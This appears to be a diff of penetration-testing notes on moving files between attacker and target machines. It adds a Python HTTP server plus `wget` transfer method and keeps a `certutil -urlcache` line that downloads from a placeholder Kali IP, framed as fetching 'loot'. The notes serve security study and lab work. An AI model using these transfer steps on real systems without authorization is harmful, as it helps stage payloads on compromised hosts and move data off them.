@@ -9,6 +9,14 @@ coverY: 0
 
 # 📤 File Transfer
 
+{% hint style="danger" %}
+WARNING
+
+When using `python3 -m http.server`, be sure to close via `CTRL + C` to send a Signal Interrupt (SIGINT) to terminate the server after use.
+
+This is because anyone on the network can arbitrarily obtain files from your system if they're listening!!
+{% endhint %}
+
 ## Windows->Linux Methods
 
 ### SMB Server
@@ -107,6 +115,35 @@ On Windows:
 
 ```
 certutil -urlcache -f http://<kali_ip_here:8000>/name_of_file name_of_file
+```
+
+### Linux -> Windows // Windows -> Linux // Windows -> Windows
+
+{% hint style="info" %}
+:bulb:UPDATE!! Newer versions of Windows now features wrappers to `wget`!&#x20;
+
+This means that we can use `wget` the same way we do on Linux on Windows to grab our loot!
+{% endhint %}
+
+**On the system you're sending files from:**
+
+```
+# Obtain IP
+ifconfig
+ip a
+ipconfig
+
+# Setup Python HTTP Server
+python3 -m http.server
+```
+
+**Receiving system:**
+
+```
+wget http://<obtained_IP_HERE>:8000/file_to_receive_here
+
+# On Windows, you need to specify -o for output file
+wget http://<obtained_IP_HERE>:8000/file_to_receive_here -o file_to_receive_here
 ```
 
 ### Evil-WinRM
